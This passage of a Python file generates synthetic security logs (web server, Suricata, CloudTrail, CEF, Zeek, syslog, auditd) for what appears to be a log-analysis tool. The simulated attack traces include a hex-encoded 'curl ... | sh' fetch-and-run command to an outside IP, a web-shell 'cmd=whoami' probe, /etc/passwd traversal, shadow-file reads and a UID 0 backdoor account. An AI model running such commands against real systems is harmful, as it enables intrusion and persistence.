            lines.append(f"{day} {clock} 10.0.0.5 GET /aspnet_client/system_web/shell.aspx cmd=whoami 443 - {SCANNER} python-requests/2.31.0 - 404 0 2 15")
        elif 108 <= i < 112:
            lines.append(f"{day} {clock} 10.0.0.5 GET /web.config - 443 - {SCANNER} Mozilla/5.00+(Nikto/2.5.0) - 404 8 0 3")
        elif i == 130:
            lines.append(f"{day} {clock} 10.0.0.5 GET /api/report - 443 CORP\\bob 198.51.100.44 Mozilla/5.0+(Windows+NT+10.0) - 500 19 13 900")
        else:
            status = random.choice(["200", "200", "200", "302", "304"])
            lines.append(f"{day} {clock} 10.0.0.5 GET /owa/ - 443 CORP\\anna 198.51.100.{40 + i % 5} Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) - {status} 0 0 {random.randint(5, 400)}")

    return "\r\n".join(lines) + "\r\n"


def json_demo() -> str:
    lines = []

    for i in range(130):
        level = random.choice(["info"] * 8 + ["warn", "error", "debug"])
        record = {
            "time": (BASE + timedelta(seconds=i * 20)).isoformat().replace("+00:00", "Z"),
            "level": level,
            "service": random.choice(["api", "worker", "auth"]),
            "msg": random.choice(["request completed", "job finished", "cache miss", "db query slow"]),
            "duration_ms": random.randint(3, 900),
        }

        if level == "error":
            record.update({"msg": "payment failed", "client_ip": f"198.51.100.{40 + i % 3}", "error": {"type": "TimeoutError", "stack": "TimeoutError: timeout\n    at pay (/app/pay.js:42:11)\n    at main (/app/index.js:7:3)"}})

        if i % 9 == 0:
            record.update({"msg": "login failed", "client_ip": ATTACKER, "user": "admin", "level": "warn"})

        lines.append(json.dumps(record))

    lines.insert(50, '{"time":"2026-10-15T08:20:00Z","level":"info","msg":"broken json line on purpose"')
    lines.append(json.dumps({"log": "panic: runtime error: index out of range\n", "stream": "stderr", "time": "2026-10-15T08:45:00.000000000Z"}))
    lines.append(json.dumps({"level": 50, "time": 1792052700000, "name": "billing", "msg": "pino-style numeric level 50 = error"}))
    return "\n".join(lines) + "\n"


def suricata_demo() -> str:
    lines = []

    def stamp(i: int) -> str:
        return (BASE + timedelta(seconds=i * 15)).strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0, 999999):06d}+0000"

    for i in range(160):
        kind = i % 10
        common = {"timestamp": stamp(i), "flow_id": 1000 + i, "in_iface": "eth0"}

        if kind == 0:
            common.update({"event_type": "alert", "src_ip": ATTACKER, "src_port": 40000 + i, "dest_ip": "10.0.0.5", "dest_port": 80, "proto": "TCP", "app_proto": "http",
                           "alert": {"action": "allowed", "gid": 1, "signature_id": 2006446, "rev": 13, "signature": "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT", "category": "Web Application Attack", "severity": 1},
                           "http": {"hostname": "example.com", "url": "/index.php?id=1 UNION SELECT", "http_method": "GET", "status": 200},
                           "payload_printable": "GET /index.php?id=1 UNION SELECT HTTP/1.1\r\nHost: example.com\r\n"})
        elif kind == 1:
            common.update({"event_type": "alert", "src_ip": SCANNER, "src_port": 45000, "dest_ip": "10.0.0.5", "dest_port": 22, "proto": "TCP",
                           "alert": {"action": "blocked", "signature_id": 2001219, "signature": "ET SCAN Potential SSH Scan", "category": "Attempted Information Leak", "severity": 2}})
        elif kind == 2:
            common.update({"event_type": "alert", "src_ip": "10.0.0.23", "src_port": 51000, "dest_ip": "10.0.0.1", "dest_port": 53, "proto": "UDP", "app_proto": "dns",
                           "alert": {"action": "allowed", "signature_id": 2027758, "signature": "ET DNS Query for .to TLD", "category": "Potentially Bad Traffic", "severity": 3}})
        elif kind == 3:
            common.update({"event_type": "dns", "src_ip": "10.0.0.23", "src_port": 5353, "dest_ip": "10.0.0.1", "dest_port": 53, "proto": "UDP",
                           "dns": {"type": "query", "id": i, "rrname": random.choice(["example.com", "update.microsoft.com", "x7f3k9q2.badc2.example"]), "rrtype": "A"}})
        elif kind == 4:
            common.update({"event_type": "http", "src_ip": "10.0.0.23", "src_port": 51200, "dest_ip": "93.184.216.34", "dest_port": 80, "proto": "TCP",
                           "http": {"hostname": "example.com", "url": "/download/tool.exe", "http_method": "GET", "status": 200, "http_user_agent": "curl/8.5.0"}})
        elif kind == 5:
            common.update({"event_type": "tls", "src_ip": "10.0.0.23", "src_port": 51300, "dest_ip": "93.184.216.34", "dest_port": 443, "proto": "TCP", "tls": {"sni": "example.com", "version": "TLS 1.3"}})
        elif kind == 6:
            common.update({"event_type": "flow", "src_ip": "10.0.0.23", "src_port": 51300, "dest_ip": "93.184.216.34", "dest_port": 443, "proto": "TCP", "app_proto": "tls",
                           "flow": {"pkts_toserver": 12, "pkts_toclient": 10, "bytes_toserver": 1500, "bytes_toclient": 9000, "state": "closed"}})
        elif kind == 7:
            common.update({"event_type": "fileinfo", "src_ip": "93.184.216.34", "src_port": 80, "dest_ip": "10.0.0.23", "dest_port": 51200, "proto": "TCP",
                           "fileinfo": {"filename": "/download/tool.exe", "magic": "PE32+ executable", "size": 482304, "stored": False}})
        elif kind == 8:
            common.update({"event_type": "anomaly", "src_ip": SCANNER, "src_port": 45001, "dest_ip": "10.0.0.5", "dest_port": 443, "proto": "TCP", "anomaly": {"type": "stream", "event": "stream.pkt_invalid_timestamp"}})
        else:
            common.update({"event_type": "ssh", "src_ip": SCANNER, "src_port": 45002, "dest_ip": "10.0.0.5", "dest_port": 22, "proto": "TCP",
                           "ssh": {"client": {"proto_version": "2.0", "software_version": "libssh2_1.10.0"}, "server": {"proto_version": "2.0", "software_version": "OpenSSH_9.6"}}})

        lines.append(json.dumps(common))

    lines.append(json.dumps({"timestamp": stamp(170), "event_type": "stats", "stats": {"uptime": 3600, "decoder": {"pkts": 125000}}}))
    return "\n".join(lines) + "\n"


def cloudtrail_demo() -> str:
    calls = [
        ("DescribeInstances", "ec2.amazonaws.com", None),
        ("GetObject", "s3.amazonaws.com", None),
        ("ListBuckets", "s3.amazonaws.com", "AccessDenied"),
        ("ConsoleLogin", "signin.amazonaws.com", "Failure"),
        ("CreateUser", "iam.amazonaws.com", None),
        ("CreateAccessKey", "iam.amazonaws.com", None),
        ("AttachUserPolicy", "iam.amazonaws.com", None),
        ("PutBucketPolicy", "s3.amazonaws.com", None),
        ("DeletePublicAccessBlock", "s3.amazonaws.com", None),
        ("AuthorizeSecurityGroupIngress", "ec2.amazonaws.com", None),
        ("GetSecretValue", "secretsmanager.amazonaws.com", None),
        ("StopLogging", "cloudtrail.amazonaws.com", None),
        ("DeleteTrail", "cloudtrail.amazonaws.com", None),
        ("DeleteDetector", "guardduty.amazonaws.com", None),
        ("ScheduleKeyDeletion", "kms.amazonaws.com", None),
    ]
    records = []

    for i in range(90):
        name, source, error = calls[i % len(calls)] if i % 3 == 0 else calls[i % 2]
        failed = error is not None
        user = random.choice(["admin", "backup", "ci"]) if failed else "dev-bob"
        record = {
            "eventVersion": "1.09",
            "userIdentity": {"type": "IAMUser", "principalId": "AIDAEXAMPLE", "arn": f"arn:aws:iam::123456789012:user/{user}", "accountId": "123456789012", "userName": user},
            "eventTime": (BASE + timedelta(minutes=i)).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "eventSource": source,
            "eventName": name,
            "awsRegion": "eu-central-1",
            "sourceIPAddress": ATTACKER if failed else "198.51.100.40",
            "userAgent": "aws-cli/2.15.0",
            "requestParameters": None,
            "responseElements": None,
            "eventID": f"demo-{i:04d}",
            "readOnly": name.startswith(("Describe", "Get", "List")),
            "eventType": "AwsApiCall",
            "recipientAccountId": "123456789012",
        }

        if name == "ConsoleLogin":
            record.update({"eventType": "AwsConsoleSignIn", "responseElements": {"ConsoleLogin": "Failure"}, "additionalEventData": {"MFAUsed": "No"}, "errorMessage": "Failed authentication"})
        elif failed:
            record.update({"errorCode": error, "errorMessage": "User is not authorized to perform s3:ListAllMyBuckets"})

        records.append(record)

    records.append({"eventVersion": "1.09", "userIdentity": {"type": "Root", "arn": "arn:aws:iam::123456789012:root", "accountId": "123456789012"},
                    "eventTime": "2026-10-15T09:35:00Z", "eventSource": "iam.amazonaws.com", "eventName": "DeactivateMFADevice", "awsRegion": "us-east-1",
                    "sourceIPAddress": ATTACKER, "userAgent": "console.amazonaws.com", "eventID": "demo-root"})
    return json.dumps({"Records": records}, indent=1)


def cef_demo() -> str:
    lines = []

    for i in range(96):
        moment = BASE + timedelta(seconds=i * 40)
        receipt = int(moment.timestamp() * 1000)
        kind = i % 6

        if kind == 0:
            lines.append(f"{moment.strftime('%b %d %H:%M:%S')} fw01 CEF:0|Fortinet|FortiGate-100F|7.2.5|0000000013|traffic:forward deny|5|rt={receipt} src={SCANNER} spt={40000 + i} dst=10.0.0.5 dpt={random.choice([22, 23, 445, 3389, 5900])} proto=6 act=deny deviceExternalId=FG100F cat=traffic")
        elif kind == 1:
            lines.append(f"CEF:0|Check Point|VPN-1 & FireWall-1|R81|Log|Accept|1|rt={receipt} src=10.0.0.23 dst=93.184.216.34 dpt=443 proto=6 act=Accept suser=CORP\\\\anna cs1Label=Rule Name cs1=Allow web")
        elif kind == 2:
            lines.append(f"<134>1 {moment.strftime('%Y-%m-%dT%H:%M:%SZ')} ids01 CEF:0|Trend Micro|Deep Security Agent|20.0|1008207|Web Server Directory Traversal Attempt|8|src={ATTACKER} dst=10.0.0.5 dpt=80 act=Reset request=http://example.com/../../etc/passwd msg=Path traversal detected cn1Label=Host ID cn1=42")
        elif kind == 3:
            lines.append(f"CEF:0|Microsoft|Windows|10|4625|An account failed to log on|7|rt={moment.strftime('%b %d %Y %H:%M:%S')} src={ATTACKER} duser=administrator outcome=failure msg=Bad password\\=wrong cat=Logon")
        elif kind == 4:
            lines.append(f"CEF:0|Palo Alto Networks|PAN-OS|11.1|threat|Command and Control Traffic|Very-High|rt={receipt} src=10.0.0.23 dst=203.0.113.200 dpt=8443 act=drop cat=spyware cs2Label=Threat Name cs2=CobaltStrike Beacon")
        else:
            lines.append(f"CEF:0|Cisco|ASA|9.18|106023|Deny tcp by access-group|Low|rt={receipt} src={random.choice(GOOD_IPS)} dst=10.0.0.9 dpt=1433 proto=6 act=deny")

    lines.insert(10, "Oct 15 08:06:00 fw01 kernel: a syslog line without CEF, kept and marked as unparsed")
    return "\n".join(lines) + "\n"


def zeek_section(path: str, fields: list[str], types: list[str], rows: list[list[str]]) -> list[str]:
    header = [
        "#separator \\x09",
        "#set_separator\t,",
        "#empty_field\t(empty)",
        "#unset_field\t-",
        f"#path\t{path}",
        "#open\t2026-10-15-08-00-00",
        "#fields\t" + "\t".join(fields),
        "#types\t" + "\t".join(types),
    ]
    return header + ["\t".join(row) for row in rows] + ["#close\t2026-10-15-09-00-00"]


def zeek_demo() -> str:
    def ts(i: int) -> str:
        return f"{BASE.timestamp() + i * 3:.6f}"

    conn_fields = ["ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p", "proto", "service", "duration", "orig_bytes", "resp_bytes", "conn_state", "history"]
    conn_types = ["time", "string", "addr", "port", "addr", "port", "enum", "string", "interval", "count", "count", "string", "string"]
    conn_rows = []

    for i in range(120):
        if 30 <= i < 80:
            conn_rows.append([ts(i), f"Cscan{i:05d}", SCANNER, str(50000 + i), "10.0.0.5", str(1 + i * 7 % 1024), "tcp", "-", "-", "-", "-", random.choice(["S0", "REJ", "RSTOS0"]), "S"])
        else:
            conn_rows.append([ts(i), f"Cok{i:05d}", f"10.0.0.{20 + i % 5}", str(51000 + i), "93.184.216.34", "443", "tcp", "ssl", f"{random.random():.3f}", str(random.randint(500, 3000)), str(random.randint(1000, 90000)), random.choice(["SF"] * 8 + ["S1", "RSTO", "OTH"]), "ShADadFf"])

    dns_fields = ["ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p", "proto", "query", "qtype_name", "rcode_name", "answers"]
    dns_types = ["time", "string", "addr", "port", "addr", "port", "enum", "string", "string", "string", "vector[string]"]
    dns_rows = [[ts(200 + i), f"Cdns{i:05d}", "10.0.0.23", str(53000 + i), "10.0.0.1", "53", "udp", q, t, r, a]
                for i, (q, t, r, a) in enumerate([("example.com", "A", "NOERROR", "93.184.216.34"), ("x7f3k9q2.badc2.example", "TXT", "NXDOMAIN", "-"), ("update.microsoft.com", "AAAA", "NOERROR", "2001:db8::1")] * 5)]

    http_fields = ["ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p", "method", "host", "uri", "status_code", "user_agent"]
    http_types = ["time", "string", "addr", "port", "addr", "port", "string", "string", "string", "count", "string"]
    http_rows = [[ts(300 + i), f"Chttp{i:05d}", ATTACKER if i % 2 else "10.0.0.24", str(52000 + i), "10.0.0.5", "80", "GET", "intranet.corp.local", u, s, ua]
                 for i, (u, s, ua) in enumerate([("/", "200", "Mozilla/5.0"), ("/../../etc/passwd", "404", "Nikto/2.5.0"), ("/admin", "403", "sqlmap/1.8"), ("/report", "500", "Mozilla/5.0")] * 3)]

    notice_fields = ["ts", "uid", "id.orig_h", "id.resp_h", "note", "msg"]
    notice_types = ["time", "string", "addr", "addr", "enum", "string"]
    notice_rows = [
        [ts(400), "-", SCANNER, "10.0.0.5", "Scan::Port_Scan", f"{SCANNER} scanned at least 15 unique ports of host 10.0.0.5 in 0m2s"],
        [ts(401), "-", ATTACKER, "10.0.0.5", "SSH::Password_Guessing", f"{ATTACKER} appears to be guessing SSH passwords (seen in 30 connections)."],
        [ts(402), "Cssl00001", "10.0.0.23", "203.0.113.200", "SSL::Invalid_Server_Cert", "SSL certificate validation failed with (self signed certificate)"],
    ]

    weird_fields = ["ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p", "name", "addl"]
    weird_types = ["time", "string", "addr", "port", "addr", "port", "string", "string"]
    weird_rows = [[ts(500), "Cweird0001", SCANNER, "45001", "10.0.0.5", "443", "bad_TCP_checksum", "-"]]

    lines = (zeek_section("conn", conn_fields, conn_types, conn_rows)
             + zeek_section("dns", dns_fields, dns_types, dns_rows)
             + zeek_section("http", http_fields, http_types, http_rows)
             + zeek_section("notice", notice_fields, notice_types, notice_rows)
             + zeek_section("weird", weird_fields, weird_types, weird_rows))
    return "\n".join(lines) + "\n"


def syslog_time(moment: datetime) -> str:
    return moment.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if moment.day < 10 else moment.strftime("%b %d %H:%M:%S")


def linux_syslog_demo() -> str:
    host = "web01"
    lines: list[tuple[datetime, str]] = []

    def add(moment: datetime, program: str, message: str) -> None:
        lines.append((moment, f"{syslog_time(moment)} {host} {program}: {message}"))

    t = BASE
    add(t, "systemd[1]", "Starting OpenBSD Secure Shell server...")
    add(t + timedelta(seconds=1), "sshd[812]", "Server listening on 0.0.0.0 port 22.")
    add(t + timedelta(seconds=2), "systemd[1]", "Started OpenBSD Secure Shell server.")

    for minute in range(0, 120, 10):
        moment = t + timedelta(minutes=minute)
        add(moment, "CRON[2201]", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
        add(moment + timedelta(seconds=1), "CRON[2202]", "(root) CMD (cd / && run-parts --report /etc/cron.hourly)")
        add(moment + timedelta(seconds=2), "CRON[2201]", "pam_unix(cron:session): session closed for user root")

    t = BASE + timedelta(minutes=5)
    add(t, "sshd[3101]", "Accepted publickey for alice from 198.51.100.40 port 50122 ssh2: ED25519 SHA256:abc")
    add(t, "sshd[3101]", "pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)")
    add(t + timedelta(seconds=1), "systemd-logind[640]", "New session 12 of user alice.")
    add(t + timedelta(minutes=1), "sudo[3150]", "   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update")
    add(t + timedelta(minutes=2), "sudo[3160]", "     bob : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash")
    add(t + timedelta(minutes=2, seconds=5), "sudo[3161]", "   guest : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
    add(t + timedelta(minutes=3), "su[3170]", "(to root) alice on pts/0")
    add(t + timedelta(minutes=3, seconds=30), "su[3171]", "FAILED SU (to root) bob on pts/1")

    t = BASE + timedelta(minutes=20)
    for attempt in range(14):
        moment = t + timedelta(seconds=attempt * 4)
        user = ["root", "root", "admin", "root", "ubuntu", "root", "test", "oracle", "root", "postgres", "admin", "pi", "root", "git"][attempt]
        invalid = "" if user in ("root",) else "invalid user "
        if invalid:
            add(moment, "sshd[4100]", f"Invalid user {user} from 203.0.113.66 port {40000 + attempt}")
        add(moment + timedelta(seconds=1), "sshd[4100]", f"Failed password for {invalid}{user} from 203.0.113.66 port {40000 + attempt} ssh2")
    add(t + timedelta(minutes=1), "sshd[4101]", "error: maximum authentication attempts exceeded for root from 203.0.113.66 port 40020 ssh2 [preauth]")
    add(t + timedelta(minutes=1, seconds=2), "sshd[4101]", "Disconnecting authenticating user root 203.0.113.66 port 40020: Too many authentication failures [preauth]")
    add(t + timedelta(minutes=2), "sshd[4102]", "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.23  user=deploy")
    add(t + timedelta(minutes=2, seconds=1), "sshd[4102]", "Failed password for deploy from 198.51.100.23 port 51000 ssh2")
    add(t + timedelta(minutes=3), "sshd[4103]", "Did not receive identification string from 45.155.205.12 port 61000")
    add(t + timedelta(minutes=3, seconds=10), "sshd[4104]", "Connection closed by authenticating user root 45.155.205.12 port 61010 [preauth]")
    add(t + timedelta(minutes=5), "sshd[4110]", "Accepted password for root from 203.0.113.66 port 40100 ssh2")
    add(t + timedelta(minutes=6), "useradd[4120]", "new group: name=support, GID=1005")
    add(t + timedelta(minutes=6, seconds=1), "useradd[4120]", "new user: name=support, UID=1005, GID=1005, home=/home/support, shell=/bin/bash, from=/dev/pts/3")
    add(t + timedelta(minutes=6, seconds=5), "usermod[4125]", "add 'support' to group 'sudo'")
    add(t + timedelta(minutes=6, seconds=6), "usermod[4125]", "add 'support' to shadow group 'sudo'")
    add(t + timedelta(minutes=6, seconds=20), "passwd[4130]", "pam_unix(passwd:chauthtok): password changed for support")
    add(t + timedelta(minutes=7), "crontab[4140]", "(root) REPLACE (root)")
    add(t + timedelta(minutes=8), "useradd[4150]", "new user: name=sysbackup, UID=0, GID=0, home=/root, shell=/bin/bash, from=/dev/pts/3")

    t = BASE + timedelta(minutes=40)
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 27017]
    for index, port in enumerate(ports):
        moment = t + timedelta(seconds=index)
        add(moment, "kernel", f"[{8123 + index}.{random.randint(100000, 999999)}] [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:aa:bb:cc SRC=45.155.205.12 DST=10.0.0.5 LEN=44 TOS=0x00 PREC=0x00 TTL=242 ID=54321 PROTO=TCP SPT=51544 DPT={port} WINDOW=1024 RES=0x00 SYN URGP=0")
    add(t + timedelta(seconds=30), "kernel", "[8160.000001] [UFW ALLOW] IN=eth0 OUT= MAC=00:16:3e:aa:bb:cc SRC=198.51.100.40 DST=10.0.0.5 LEN=60 PROTO=TCP SPT=50122 DPT=22 WINDOW=64240 SYN URGP=0")
    add(t + timedelta(seconds=40), "kernel", "[8170.000002] [UFW AUDIT] IN= OUT=eth0 SRC=10.0.0.5 DST=91.189.91.39 LEN=60 PROTO=TCP SPT=40100 DPT=80 WINDOW=64240 SYN URGP=0")
    add(t + timedelta(minutes=2), "kernel", "[8240.123456] audit: type=1400 audit(1792054920.123:88): apparmor=\"DENIED\" operation=\"open\" profile=\"/usr/sbin/cupsd\" name=\"/etc/shadow\" pid=2210 comm=\"cupsd\" requested_mask=\"r\" denied_mask=\"r\" fsuid=0 ouid=0")
    add(t + timedelta(minutes=3), "kernel", "[8300.555555] Out of memory: Killed process 2875 (java) total-vm:8123456kB, anon-rss:4012345kB, file-rss:0kB, shmem-rss:0kB, UID:1001 pgtables:9000kB oom_score_adj:0")
    add(t + timedelta(minutes=4), "kernel", "[8360.111111] php-fpm8.2[3011]: segfault at 0 ip 00007f1c2a3b4c5d sp 00007ffd1e2f3a40 error 4 in libc.so.6[7f1c2a200000+195000]")
    add(t + timedelta(minutes=5), "kernel", "[8420.222222] EXT4-fs error (device sda1): ext4_find_entry:1455: inode #131074: comm nginx: reading directory lblock 0")
    add(t + timedelta(minutes=6), "kernel", "[8480.333333] usb 1-1: New USB device found, idVendor=0781, idProduct=5581, bcdDevice= 1.00")
    add(t + timedelta(minutes=7), "kernel", "[8540.444444] TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.")

    t = BASE + timedelta(minutes=55)
    add(t, "systemd[1]", "nginx.service: Main process exited, code=exited, status=1/FAILURE")
    add(t + timedelta(seconds=1), "systemd[1]", "nginx.service: Failed with result 'exit-code'.")
    add(t + timedelta(seconds=2), "systemd[1]", "Failed to start A high performance web server and a reverse proxy server.")
    add(t + timedelta(seconds=10), "systemd[1]", "mysql.service: Scheduled restart job, restart counter is at 5.")
    add(t + timedelta(minutes=1), "postfix/smtpd[5100]", "connect from unknown[203.0.113.66]")
    for attempt in range(6):
        add(t + timedelta(minutes=1, seconds=2 + attempt), "postfix/smtpd[5100]", "warning: unknown[203.0.113.66]: SASL LOGIN authentication failed: UGFzc3dvcmQ6")
    add(t + timedelta(minutes=1, seconds=10), "postfix/smtpd[5100]", "disconnect from unknown[203.0.113.66] ehlo=1 auth=0/6 commands=1/7")
    add(t + timedelta(minutes=2), "postfix/smtpd[5101]", "NOQUEUE: reject: RCPT from spam.example[192.0.2.55]: 554 5.7.1 Service unavailable; Client host [192.0.2.55] blocked using zen.spamhaus.org; from=<x@spam.example> to=<alice@example.com> proto=ESMTP helo=<spam.example>")
    add(t + timedelta(minutes=3), "postfix/smtp[5110]", "4F2A11C0E3: to=<bob@partner.example>, relay=mx.partner.example[198.51.100.70]:25, delay=1.2, dsn=2.0.0, status=sent (250 2.0.0 OK)")
    add(t + timedelta(minutes=3, seconds=30), "postfix/smtp[5111]", "5A3B22D1F4: to=<nobody@gone.example>, relay=none, delay=30, dsn=5.1.2, status=bounced (Host or domain name not found)")
    add(t + timedelta(minutes=4), "dovecot[700]", "imap-login: Disconnected (auth failed, 3 attempts in 12 secs): user=<alice>, method=PLAIN, rip=203.0.113.77, lip=10.0.0.5, TLS, session=<abc>")
    add(t + timedelta(minutes=4, seconds=30), "dovecot[700]", "imap-login: Login: user=<alice>, method=PLAIN, rip=198.51.100.40, lip=10.0.0.5, mpid=7001, TLS, session=<def>")
    add(t + timedelta(minutes=6), "fail2ban.actions[900]", "NOTICE  [sshd] Ban 203.0.113.66")
    add(t + timedelta(minutes=7), "systemd-logind[640]", "Removed session 12.")
    add(t + timedelta(minutes=8), "web01-app[3333]", "Something happened that no rule knows about, but it is still shown.")

    lines.sort(key=lambda item: item[0])
    output = [line for _, line in lines]
    output.insert(30, "    continuation line that belongs to the previous message")
    output.insert(60, "garbage line without a syslog header, kept and marked as unparsed")
    return "\n".join(output) + "\n"


def audit_demo() -> str:
    records: list[str] = []
    serial = 1000
    stamp_base = BASE.timestamp()

    def event(offset: float, *parts: str) -> None:
        nonlocal serial
        serial += 1
        stamp = f"{stamp_base + offset:.3f}:{serial}"
        for part in parts:
            kind, rest = part.split(" ", 1)
            records.append(f"type={kind} msg=audit({stamp}): {rest}")

    def hexed(text: str) -> str:
        return text.encode().hex().upper()

    event(0, "DAEMON_START op=start ver=3.1.2 format=enriched kernel=6.8.0 auid=4294967295 pid=600 uid=0 ses=4294967295 res=success")
    event(2, "CONFIG_CHANGE auid=4294967295 ses=4294967295 op=add_rule key=\"passwd_changes\" list=4 res=1")
    for attempt in range(7):
        user = ["root", "admin", "root", "oracle", "root", "test", "ubuntu"][attempt]
        event(60 + attempt * 3, f"USER_LOGIN pid=4100 uid=0 auid=4294967295 ses=4294967295 msg='op=login acct=\"{user}\" exe=\"/usr/sbin/sshd\" hostname=? addr=203.0.113.66 terminal=sshd res=failed'")
    event(90, "USER_AUTH pid=3101 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_unix acct=\"alice\" exe=\"/usr/sbin/sshd\" hostname=198.51.100.40 addr=198.51.100.40 terminal=ssh res=success'")
    event(91, "USER_ACCT pid=3101 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:accounting grantors=pam_unix acct=\"alice\" exe=\"/usr/sbin/sshd\" hostname=198.51.100.40 addr=198.51.100.40 terminal=ssh res=success'")
    event(92, "CRED_ACQ pid=3101 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:setcred grantors=pam_unix acct=\"alice\" exe=\"/usr/sbin/sshd\" hostname=198.51.100.40 addr=198.51.100.40 terminal=ssh res=success'")
    event(93, "LOGIN pid=3101 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=12 res=1")
    event(94, "USER_LOGIN pid=3101 uid=0 auid=1000 ses=12 msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=198.51.100.40 addr=198.51.100.40 terminal=/dev/pts/0 res=success'")
    event(120, f"USER_CMD pid=3150 uid=1000 auid=1000 ses=12 msg='cwd=\"/home/alice\" cmd={hexed('apt update')} exe=\"/usr/bin/sudo\" terminal=pts/0 res=success'")
    event(125, f"USER_CMD pid=3160 uid=1001 auid=1001 ses=13 msg='cwd=\"/home/bob\" cmd={hexed('cat /etc/shadow')} exe=\"/usr/bin/sudo\" terminal=pts/1 res=failed'")
    event(126, "USER_AUTH pid=3160 uid=1001 auid=1001 ses=13 msg='op=PAM:authentication grantors=? acct=\"bob\" exe=\"/usr/bin/sudo\" hostname=? addr=? terminal=/dev/pts/1 res=failed'")
    event(180, "ADD_GROUP pid=4120 uid=0 auid=1000 ses=12 msg='op=add-group id=1005 exe=\"/usr/sbin/useradd\" hostname=web01 addr=? terminal=pts/3 res=success'")
    event(181, "ADD_USER pid=4120 uid=0 auid=1000 ses=12 msg='op=add-user id=1005 exe=\"/usr/sbin/useradd\" hostname=web01 addr=? terminal=pts/3 res=success'")
    event(182, "USER_MGMT pid=4125 uid=0 auid=1000 ses=12 msg='op=add-user-to-group grp=\"sudo\" acct=\"support\" exe=\"/usr/sbin/usermod\" hostname=web01 addr=? terminal=pts/3 res=success'")
    event(183, "USER_CHAUTHTOK pid=4130 uid=0 auid=1000 ses=12 msg='op=PAM:chauthtok grantors=pam_unix acct=\"support\" exe=\"/usr/bin/passwd\" hostname=web01 addr=? terminal=pts/3 res=success'")
    event(240,
          "SYSCALL arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd0b2e a2=241 a3=1b6 items=2 ppid=4000 pid=4200 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts3 ses=12 comm=\"vim\" exe=\"/usr/bin/vim.basic\" key=\"passwd_changes\"",
          "CWD cwd=\"/root\"",
          "PATH item=0 name=\"/etc/\" inode=393217 dev=08:01 mode=040755 ouid=0 ogid=0 nametype=PARENT",
          "PATH item=1 name=\"/etc/passwd\" inode=393300 dev=08:01 mode=0100644 ouid=0 ogid=0 nametype=NORMAL",
          f"PROCTITLE proctitle={hexed('vim') + '00' + hexed('/etc/passwd')}")
    event(300,
          "SYSCALL arch=c000003e syscall=59 success=yes exit=0 a0=55d1 a1=55d2 a2=55d3 a3=0 items=2 ppid=4100 pid=4300 auid=0 uid=0 gid=0 euid=0 tty=pts4 ses=14 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"exec_tmp\"",
          "EXECVE argc=3 a0=\"bash\" a1=\"-c\" a2=" + hexed("curl -s http://203.0.113.66/x.sh | sh"),
          "CWD cwd=\"/tmp\"",
          "PATH item=0 name=\"/usr/bin/bash\" inode=1310 dev=08:01 mode=0100755 nametype=NORMAL",
          f"PROCTITLE proctitle={hexed('bash') + '00' + hexed('-c') + '00' + hexed('curl -s http://203.0.113.66/x.sh | sh')}")
    event(330, "ANOM_PROMISCUOUS dev=eth0 prom=256 old_prom=0 auid=0 uid=0 gid=0 ses=14")
    event(360, "AVC avc:  denied  { read } for  pid=2210 comm=\"httpd\" name=\"shadow\" dev=\"sda1\" ino=393301 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0")
    event(400, "SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=nginx comm=\"systemd\" exe=\"/usr/lib/systemd/systemd\" hostname=? addr=? terminal=? res=failed'")
    event(420, "ANOM_ABEND auid=4294967295 uid=33 gid=33 ses=4294967295 pid=3011 comm=\"php-fpm8.2\" exe=\"/usr/sbin/php-fpm8.2\" sig=11 res=1")
    for minute in range(0, 60, 15):
        event(600 + minute * 60, "USER_START pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:session_open grantors=pam_unix acct=\"root\" exe=\"/usr/sbin/cron\" hostname=? addr=? terminal=cron res=success'")
        event(601 + minute * 60, "CRED_DISP pid=2201 uid=0 auid=0 ses=20 msg='op=PAM:setcred grantors=pam_unix acct=\"root\" exe=\"/usr/sbin/cron\" hostname=? addr=? terminal=cron res=success'")

    return "\n".join(records) + "\n"


def journal_demo() -> str:
    entries = []

    def add(offset: int, identifier: str, message: str, priority: int = 6, unit: str = "", pid: int = 1000, uid: int = 0) -> None:
        moment = BASE + timedelta(seconds=offset)
        entry = {
            "__CURSOR": f"s=demo;i={len(entries) + 1}",
            "__REALTIME_TIMESTAMP": str(int(moment.timestamp() * 1_000_000)),
            "_BOOT_ID": "3f2a9c1e5b7d4e8f9a0b1c2d3e4f5a6b",
            "_HOSTNAME": "web01",
            "PRIORITY": str(priority),
            "SYSLOG_FACILITY": "4" if identifier in ("sshd", "sudo", "su") else "3",
            "SYSLOG_IDENTIFIER": identifier,
            "_PID": str(pid),
